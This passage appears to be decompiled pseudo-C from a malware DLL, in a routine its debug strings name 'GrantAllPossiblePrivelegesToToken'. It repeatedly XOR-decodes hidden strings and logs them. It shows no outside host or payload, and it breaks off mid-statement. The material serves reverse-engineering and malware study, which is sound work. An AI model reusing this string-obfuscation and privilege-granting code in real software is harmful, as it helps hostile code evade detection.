var_14h = 0x1134163d;\n    var_10h = 0xd251f1a;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x37;\n    var_ch._3_1_ = 6;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x1c;\n    var_8h._2_1_ = 0x3e;\n    var_8h._3_1_ = 8;\n    var_4h._0_1_ = 0xb;\n    var_4h._1_1_ = 0x14;\n    var_4h._2_1_ = 2;\n    var_4h._3_1_ = 0x74;\n    var_28h = 0x7467736e;\n    var_24h = 0x64576a79;\n    fcn.00401000(0x14);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_9ch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_9ch];\n    } while (uVar6 < 0x14);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 299);\n    fcn.0040d022();\n    var_1ch = 0x2f1d363d;\n    var_18h = 0x4e0c0e0f;\n    var_14h = 0x3d3b3600;\n    var_10h = 0x6933020c;\n    var_ch._0_1_ = 0x1c;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x27;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x24;\n    var_8h._3_1_ = 0x5c;\n    var_4h._0_1_ = 0x6e;\n    var_28h = 0x4e49536e;\n    var_24h = 0x39436b64;\n    fcn.00401000(0x19);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_98h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_98h];\n    } while (uVar6 < 0x19);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x12e);\n    fcn.0040d022();\n    var_18h = 0x5d262131;\n    var_14h = 0x10282929;\n    var_10h = 0x3a571c2d;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0xb;\n    var_ch._3_1_ = 0x32;\n    var_8h._0_1_ = 3;\n    var_8h._1_1_ = 0x5e;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x2a;\n    var_4h._0_1_ = 9;\n    var_4h._1_1_ = 0x62;\n    var_60h = 0x326a4462;\n    var_5ch._0_2_ = 0x4d48;\n    var_5ch._2_1_ = 0x6c;\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_d0h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_60h + iVar7) ^ puVar1[&var_18h - var_d0h];\n    } while (iVar8 < 0x16);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x131);\n    fcn.0040d022();\n    var_1ch = 0x323a0001;\n    var_18h = 0x2f0b0432;\n    var_14h = 0x2d061702;\n    var_10h = 0x120b1c28;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0xc;\n    var_ch._2_1_ = 0x1f;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x15;\n    var_8h._2_1_ = 9;\n    var_8h._3_1_ = 0x27;\n    var_4h._0_1_ = 0x52;\n    var_28h = 0x4b696552;\n    var_24h = 0x426e7041;\n    fcn.00401000(0x19);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_60h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_60h];\n    } while (uVar6 < 0x19);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x134);\n    fcn.0040d022();\n    var_18h = 0x48290f3d;\n    var_14h = 0x26154718;\n    var_10h = 0x5417031a;\n    var_ch._0_1_ = 0x3b;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 6;\n    var_8h._2_1_ = 0x1f;\n    var_8h._3_1_ = 0x56;\n    var_4h._0_1_ = 0xe;\n    var_4h._1_1_ = 0x33;\n    var_28h = 0x317a6a6e;\n    var_24h = 0x4b70336b;\n    fcn.00401000(0x16);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_d8h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_18h - var_d8h];\n    } while (uVar6 < 0x16);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x137);\n    fcn.0040d022();\n    var_20h = 0x233e2730;\n    var_1ch = 0xf3a3058;\n    var_18h = 0x59383d27;\n    var_14h = 0x12063f31;\n    var_10h = 0x33543e1c;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x12;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0x38;\n    var_8h._1_1_ = 0x41;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 6;\n    var_4h._1_1_ = 0x25;\n    var_4h._2_1_ = 0xb;\n    var_4h._3_1_ = 0x51;\n    var_50h = 0x516e4263;\n    var_4ch._0_2_ = 0x5637;\n    var_4ch._2_1_ = 0x53;\n    fcn.00401000(0x20);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_b0h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_50h + iVar7) ^ puVar1[&var_20h - var_b0h];\n    } while (iVar8 < 0x20);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x13a);\n    fcn.0040d022();\n    var_20h = 0x293d0331;\n    var_1ch = 0x270e3b52;\n    var_18h = 0x26360311;\n    var_14h = 0x343b2c42;\n    var_10h = 0x2e06090b;\n    var_ch._0_1_ = 0x45;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x34;\n    var_8h._0_1_ = 0xb;\n    var_8h._1_1_ = 0x10;\n    var_8h._2_1_ = 0x1d;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0xe;\n    var_4h._3_1_ = 0x46;\n    var_28h = 0x47746662;\n    var_24h = 0x466b4931;\n    fcn.00401000(0x20);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_50h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_20h - var_50h];\n    } while (uVar6 < 0x20);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x13d);\n    fcn.0040d022();\n    var_1ch = 0x1b040c1f;\n    var_18h = 0x29052b0b;\n    var_14h = 0xb0e2639;\n    var_10h = 0xc20182c;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 7;\n    var_ch._3_1_ = 0x3c;\n    var_8h._0_1_ = 0x18;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 0x20;\n    var_4h._0_1_ = 0xc;\n    var_4h._1_1_ = 0x6e;\n    var_40h = 0x6947694c;\n    var_3ch._0_2_ = 0x4a6e;\n    var_3ch._2_1_ = 0x71;\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_a8h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_40h + iVar7) ^ puVar1[&var_1ch - var_a8h];\n    } while (iVar8 < 0x1a);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x140);\n    fcn.0040d022();\n    var_1ch = 0x4725506a;\n    var_18h = 0x3f32382f;\n    var_14h = 0x58145069;\n    var_10h = 0x3423372b;\n    var_ch._0_1_ = 0x4d;\n    var_ch._1_1_ = 0x65;\n    var_ch._2_1_ = 0x14;\n    var_ch._3_1_ = 0x5c;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x30;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 0x5e;\n    var_4h._1_1_ = 0x50;\n    var_4h._2_1_ = 0x66;\n    var_28h = 0x35663539;\n    var_24h = 0x5a46594a;\n    fcn.00401000(0x1b);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_40h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_40h];\n    } while (uVar6 < 0x1b);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x143);\n    fcn.0040d022();\n    var_14h = 0x37142907;\n    var_10h = 0x24370a2d;\n    var_ch._0_1_ = 0x1c;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x38;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 0x56;\n    var_78h = 0x56564c54;\n    var_74h._0_2_ = 0x614e;\n    var_74h._2_1_ = 0x42;\n    fcn.00401000(0x12);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_94h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_78h + iVar7) ^ puVar1[&var_14h - var_94h];\n    } while (iVar8 < 0x12);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x146);\n    fcn.0040d022();\n    var_14h = 0x553d3417;\n    var_10h = 0x3603191e;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x42;\n    var_ch._3_1_ = 4;\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 5;\n    var_8h._2_1_ = 0x28;\n    var_8h._3_1_ = 0x34;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x55;\n    var_4h._2_1_ = 0x6d;\n    var_38h = 0x306f5144;\n    var_34h._0_2_ = 0x6d6d;\n    var_34h._2_1_ = 0x6c;\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_78h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_38h + iVar7) ^ puVar1[&var_14h - var_78h];\n    } while (iVar8 < 0x13);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x149);\n    fcn.0040d022();\n    var_14h = 0xe65152a;\n    var_10h = 0x382d163b;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x66;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0x27;\n    var_8h._1_1_ = 0x14;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x3b;\n    var_4h._0_1_ = 0x1c;\n    var_4h._1_1_ = 0x17;\n    var_4h._2_1_ = 0x53;\n    var_4h._3_1_ = 0x66;\n    var_28h = 0x66367079;\n    var_24h = 0x5749624e;\n    fcn.00401000(0x14);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_38h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_38h];\n    } while (uVar6 < 0x14);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x14c);\n    fcn.0040d022();\n    var_14h = 0x2f220e60;\n    var_10h = 0x18214021;\n    var_ch._0_1_ = 0x41;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x10;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x50;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x33;\n    var_28h = 0x4a666b33;\n    var_24h = 0x48463543;\n    fcn.00401000(0x11);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_dch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_dch];\n    } while (uVar6 < 0x11);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x14f);\n    fcn.0040d022();\n    var_14h = 0x340a301b;\n    var_10h = 0x29245020;\n    var_ch._0_1_ = 0x3a;\n    var_ch._1_1_ = 0x3c;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x5c;\n    var_8h._2_1_ = 0x37;\n    var_8h._3_1_ = 0x1c;\n    var_4h._0_1_ = 0x48;\n    var_28h = 0x414b5548;\n    var_24h = 0x79503944;\n    fcn.00401000(0x11);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_bch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_bch];\n    } while (uVar6 < 0x11);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x152);\n    fcn.0040d022();\n    var_20h = 0x3b3f2067;\n    var_1ch = 0x18324632;\n    var_18h = 0x2b1a2b71;\n    var_14h = 0x18395d33;\n    var_10h = 0x12182b51;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x5b;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0x27;\n    var_4h._0_1_ = 0x41;\n    var_28h = 0x426c4534;\n    var_24h = 0x75573241;\n    fcn.00401000(0x1d);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_a4h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_20h - var_a4h];\n    } while (uVar6 < 0x1d);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x155);\n    fcn.0040d022();\n    var_18h = 0x2290b24;\n    var_14h = 0x50535d53;\n    var_10h = 0x31e0139;\n    var_ch._0_1_ = 0x54;\n    var_ch._1_1_ = 0x4a;\n    var_ch._2_1_ = 100;\n    var_ch._3_1_ = 0x47;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 0x18;\n    var_8h._2_1_ = 3;\n    var_8h._3_1_ = 6;\n    var_4h._0_1_ = 0x57;\n    var_4h._1_1_ = 0x54;\n    var_4h._2_1_ = 0x51;\n    var_4h._3_1_ = 0x35;\n    var_28h = 0x6a6a6e77;\n    var_24h = 0x35343332;\n    fcn.00401000(0x18);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_b8h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_18h - var_b8h];\n    } while (uVar6 < 0x18);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x158);\n    fcn.0040d022();\n    var_1ch = 0x10140926;\n    var_18h = 0x31241509;\n    var_14h = 0x1330426;\n    var_10h = 0x3a271500;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x2f;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 0xd;\n    var_8h._1_1_ = 0x16;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x33;\n    var_4h._0_1_ = 0x10;\n    var_4h._1_1_ = 0x6c;\n    var_28h = 0x75466c75;\n    var_24h = 0x54507a64;\n    fcn.00401000(0x1a);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_c8h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_c8h];\n    } while (uVar6 < 0x1a);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x15b);\n    fcn.0040d022();\n    var_14h = 0x5b6c5230;\n    var_10h = 0x39565b5c;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 0x50;\n    var_ch._3_1_ = 0x43;\n    var_8h._0_1_ = 0x51;\n    var_8h._1_1_ = 0x58;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 6;\n    var_4h._1_1_ = 0x37;\n    var_28h = 0x35393763;\n    var_24h = 0x52353438;\n    fcn.00401000(0x12);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_e0h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_e0h];\n    } while (uVar6 < 0x12);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x15e);\n    fcn.0040d022();\n    var_18h = 0x3a313515;\n    var_14h = 0x2137120f;\n    var_10h = 0x31370c35;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 0x1f;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x39;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x76;\n    var_88h = 0x43625046;\n    var_84h._0_2_ = 0x7161;\n    var_84h._2_1_ = 0x76;\n    fcn.00401000(0x15);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_a0h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_88h + iVar7) ^ puVar1[&var_18h - var_a0h];\n    } while (iVar8 < 0x15);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x161);\n    fcn.0040d022();\n    var_1ch = 0x2d715632;\n    var_18h = 0x4550612;\n    var_14h = 0x162f5177;\n    var_10h = 0x5a155803;\n    var_ch._0_1_ = 0x5b;\n    var_ch._1_1_ = 0x2d;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x16;\n    var_8h._0_1_ = 0x50;\n    var_8h._1_1_ = 0x17;\n    var_8h._2_1_ = 0x5a;\n    var_8h._3_1_ = 0x58;\n    var_4h._0_1_ = 0x26;\n    var_4h._1_1_ = 0x14;\n    var_4h._2_1_ = 1;\n    var_4h._3_1_ = 0x39;\n    var_48h = 0x43343361;\n    var_44h._0_2_ = 0x6473;\n    var_44h._2_1_ = 0x39;\n    fcn.00401000(0x1c);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_88h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_48h + iVar7) ^ puVar1[&var_1ch - var_88h];\n    } while (iVar8 < 0x1c);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x164);\n    fcn.0040d022();\n    var_18h = 0x547b210a;\n    var_14h = 0x3c002318;\n    var_10h = 0x3595912;\n    var_ch._0_1_ = 0x2f;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 0x36;\n    var_8h._0_1_ = 0x5f;\n    var_8h._1_1_ = 0x43;\n    var_8h._2_1_ = 0x1f;\n    var_8h._3_1_ = 0x2e;\n    var_4h._0_1_ = 2;\n    var_4h._1_1_ = 0x3e;\n    var_4h._2_1_ = 0x21;\n    var_4h._3_1_ = 0x36;\n    var_90h = 0x35364459;\n    var_8ch._0_2_ = 0x4276;\n    var_8ch._2_1_ = 0x67;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_48h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_90h + iVar7) ^ puVar1[&var_18h - var_48h];\n    } while (iVar8 < 0x18);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x167);\n    fcn.0040d022();\n    var_18h = 0x27025361;\n    var_14h = 0x32133106;\n    var_10h = 0x3e2a585d;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x44;\n    var_8h._1_1_ = 0x5f;\n    var_8h._2_1_ = 0x27;\n    var_8h._3_1_ = 0x2f;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x31;\n    var_4h._2_1_ = 0x61;\n    var_28h = 0x4a4b3632;\n    var_24h = 0x41615476;\n    fcn.00401000(0x17);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_90h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_18h - var_90h];\n    } while (uVar6 < 0x17);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x16a);\n    fcn.0040d022();\n    var_18h = 0x30120267;\n    var_14h = 0x51435850;\n    var_10h = 0x572d3d20;\n    var_ch._0_1_ = 0x58;\n    var_ch._1_1_ = 0x5b;\n    var_ch._2_1_ = 100;\n    var_ch._3_1_ = 0x15;\n    var_8h._0_1_ = 0x38;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0x55;\n    var_4h._0_1_ = 0x52;\n    var_4h._1_1_ = 0x53;\n    var_4h._2_1_ = 2;\n    var_4h._3_1_ = 0x51;\n    var_68h = 0x42516734;\n    var_64h._0_2_ = 0x3935;\n    var_64h._2_1_ = 0x37;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_e4h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_68h + iVar7) ^ puVar1[&var_18h - var_e4h];\n    } while (iVar8 < 0x18);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x16d);\n    fcn.0040d022();\n    var_20h = 0x19265663;\n    var_1ch = 0x261e4534;\n    var_18h = 0xe007054;\n    var_14h = 0x2d0b7b25;\n    var_10h = 0xe115071;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 0x3a;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x59;\n    var_8h._1_1_ = 0x45;\n    var_8h._2_1_ = 0x1b;\n    var_8h._3_1_ = 7;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x51;\n    var_4h._2_1_ = 0xf;\n    var_4h._3_1_ = 0x43;\n    var_28h = 0x6b723330;\n    var_24h = 0x436a3641;\n    fcn.00401000(0x20);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_68h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_20h - var_68h];\n    } while (uVar6 < 0x20);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x170);\n    fcn.0040d022();\n    var_14h = 0x31345d1e;\n    var_10h = 0x28522958;\n    var_ch._0_1_ = 0x54;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 0x5d;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x59;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x5d;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x31;\n    var_4h._2_1_ = 0x34;\n    var_58h = 0x5466384d;\n    var_54h._0_2_ = 0x4834;\n    var_54h._2_1_ = 0x30;\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_c0h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_58h + iVar7) ^ puVar1[&var_14h - var_c0h];\n    } while (iVar8 < 0x13);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x173);\n    fcn.0040d022();\n    var_20h = 0x73c1405;\n    var_1ch = 0x37262030;\n    var_18h = 0x3c3e1002;\n    var_14h = 0x1f3f2820;\n    var_10h = 0x26363a12;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 0;\n    var_8h._1_1_ = 0x3f;\n    var_8h._2_1_ = 0x37;\n    var_8h._3_1_ = 0x24;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 0x71;\n    var_28h = 0x69757156;\n    var_24h = var_24h & 0xff000000 | 0x435253;\n    fcn.00401000(0x1e);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_58h;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_28h + iVar7) ^ puVar1[&var_20h - var_58h];\n    } while (iVar8 < 0x1e);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x176);\n    fcn.0040d022();\n    var_14h = 0x1f165d63;\n    var_10h = 0x5c1e1f08;\n    var_ch._0_1_ = 0x5e;\n    var_ch._1_1_ = 0x5d;\n    var_ch._2_1_ = 0x12;\n    var_ch._3_1_ = 4;\n    var_8h._0_1_ = 0xc;\n    var_8h._1_1_ = 0xc;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x5f;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x5f;\n    var_4h._2_1_ = 0x27;\n    var_4h._3_1_ = 0x76;\n    var_28h = 